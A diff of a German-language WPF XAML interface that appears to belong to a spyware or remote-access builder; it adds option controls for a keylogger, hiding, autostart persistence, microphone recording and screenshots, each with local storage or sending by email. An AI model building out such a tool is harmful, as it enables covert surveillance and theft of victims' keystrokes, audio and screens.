@@ -393,7 +393,7 @@
                     <TextBlock VerticalAlignment="Center" HorizontalAlignment="Center" FontSize="14">Ändern...</TextBlock>
                 </Border>
             </Grid>
-            <Grid x:Name="baukastenGrid2" Grid.Column="1" Opacity="0" IsEnabled="False" IsHitTestVisible="False">
+            <Grid x:Name="baukastenGrid2" Grid.Column="1" Opacity="1" IsEnabled="True" IsHitTestVisible="True">
                 <Grid.ColumnDefinitions>
                     <ColumnDefinition Width="20"/>
                     <ColumnDefinition Width="1*"/>
@@ -417,15 +417,28 @@
                     <RowDefinition Height="1*"/>
                     <RowDefinition Height="1*"/>
                 </Grid.RowDefinitions>
-                <CheckBox x:Name="keyloggerCheckbox" Grid.Row="0" Grid.Column="1" VerticalAlignment="Center">Keylogger</CheckBox>
-
+                <CheckBox x:Name="keyloggerCheckbox" Grid.Row="0" Grid.Column="1" VerticalAlignment="Center" Checked="keyloggerCheckbox_Checked" Unchecked="keyloggerCheckbox_Unchecked">Keylogger</CheckBox>
+                <CheckBox IsEnabled="False" Checked="keyloggerLocalCheckbox_Checked" Unchecked="keyloggerLocalCheckbox_Unchecked" x:Name="keyloggerLocalCheckbox" Grid.Column="2" VerticalAlignment="Center">Lokal loggen</CheckBox>
+                <ComboBox IsEnabled="False" x:Name="keyloggerLocalCombobox" Grid.Row="1" Grid.Column="2" VerticalContentAlignment="Center" SelectedIndex="0">
+                    <ComboBoxItem>AppData\Roaming</ComboBoxItem>
+                    <ComboBoxItem>AppData\Local</ComboBoxItem>
+                    <ComboBoxItem>Dokumente</ComboBoxItem>
+                </ComboBox>
+                <CheckBox IsEnabled="False" x:Name="keyloggerEmailCheckbox" Grid.Column="4" VerticalAlignment="Center">Per Email versenden</CheckBox>
                 <CheckBox x:Name="hideCheckbox" Grid.Row="2" Grid.Column="1" VerticalAlignment="Center">Verstecken</CheckBox>
-
                 <CheckBox x:Name="autostartCheckbox" Grid.Row="4" Grid.Column="1" VerticalAlignment="Center">Autostart</CheckBox>
-
+                <CheckBox IsEnabled="False" x:Name="autostartCopyCheckbox" Grid.Row="4" Grid.Column="2" Grid.ColumnSpan="2" VerticalContentAlignment="Center">Anderer Speicherort</CheckBox>
+                <ComboBox IsEnabled="False" x:Name="autostartCopyCombobox" Grid.Column="2" Grid.Row="5" VerticalContentAlignment="Center" SelectedIndex="0">
+                    <ComboBoxItem>AppData\Roaming</ComboBoxItem>
+                    <ComboBoxItem>AppData\Local</ComboBoxItem>
+                    <ComboBoxItem>Dokumente</ComboBoxItem>
+                </ComboBox>
                 <CheckBox x:Name="microphoneCheckbox" Grid.Row="6" Grid.Column="1" VerticalAlignment="Center">Mikrofonaufnahme</CheckBox>
-
+                <CheckBox IsEnabled="False" x:Name="microphoneLocalCheckbox" Grid.Column="2" Grid.Row="6" VerticalAlignment="Center">Lokal speichern</CheckBox>
+                <CheckBox IsEnabled="False" x:Name="microphoneEmailCheckbox" Grid.Column="4" Grid.Row="6" VerticalAlignment="Center">Per Email versenden</CheckBox>
                 <CheckBox x:Name="screenshotCheckbox" Grid.Row="8" Grid.Column="1" VerticalAlignment="Center">Screenshots</CheckBox>
+                <CheckBox IsEnabled="False" x:Name="screenshotLocalCheckbox" Grid.Row="8" Grid.Column="2" VerticalAlignment="Center">Lokal speichern</CheckBox>
+                <CheckBox IsEnabled="False" x:Name="screenshotEmailCheckbox" Grid.Row="8" Grid.Column="4" VerticalAlignment="Center">Per Email versenden</CheckBox>
             </Grid>
             <Grid x:Name="baukastenGrid3" Grid.Column="1" Opacity="0" IsEnabled="False" IsHitTestVisible="False">
                 <Grid.ColumnDefinitions>
@@ -510,7 +523,7 @@
                     <RowDefinition Height="1*"/>
                 </Grid.RowDefinitions>
             </Grid>
-            <Grid x:Name="baukastenGrid6" Grid.Column="1" Opacity="1" IsEnabled="True" IsHitTestVisible="True">
+            <Grid x:Name="baukastenGrid6" Grid.Column="1" Opacity="0" IsEnabled="False" IsHitTestVisible="False">
                 <Grid.ColumnDefinitions>
                     <ColumnDefinition Width="20"/>
                     <ColumnDefinition Width="1*"/>
